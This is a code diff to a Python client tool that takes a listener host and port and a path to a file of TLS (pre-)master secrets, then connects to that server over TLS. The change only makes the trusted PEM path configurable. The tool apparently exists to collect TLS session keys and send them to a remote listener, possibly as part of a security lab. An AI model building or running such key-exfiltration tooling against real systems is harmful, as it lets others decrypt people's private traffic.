@@ -33,6 +33,7 @@ def main():
     parser.add_argument("--LPORT", "-LPORT", type=int, help="The port that is listening on the server.")
     parser.add_argument("--interactive", action="store_true", help="Initializate the tool in interactive mode.")
     parser.add_argument("--secrets_path", "-secrets_path", type=str, help="The path to the secrets file.")
+    parser.add_argument("--publicpem", "-publicpem", type=str, help="The path to the public pem.")
     arguments = parser.parse_args()
 
     if (len(sys.argv) == 1):
@@ -49,10 +50,12 @@ def main():
         HOST = str(input(Fore.GREEN + "Enter the IP of the server: ")) # The server's hostname or IP address
         PORT = int(input("Enter the server port: ")) # The port used by the server
         SECRETS_PATH = str(input(Fore.GREEN + "Enter the path with the (Pre)-Master Secrets: "))
+        PUBLICPEM = str(input(Fore.GREEN + "Enter the path to the public PEM file: "))
     else:
         HOST = arguments.LHOST
         PORT = arguments.LPORT
         SECRETS_PATH = arguments.secrets_path
+        PUBLICPEM = arguments.publicpem
 
     #sslkeylog_path = str(input("Introduce donde desea almacenar las claves: "))
     #configuracion(sslkeylog_path)
@@ -64,7 +67,7 @@ def main():
         filesize = 0
 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    context.load_verify_locations('/home/kali/Desktop/public.pem')
+    context.load_verify_locations(PUBLICPEM)
 
     conn = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname="proxy.com")
     conn.connect((HOST, PORT))
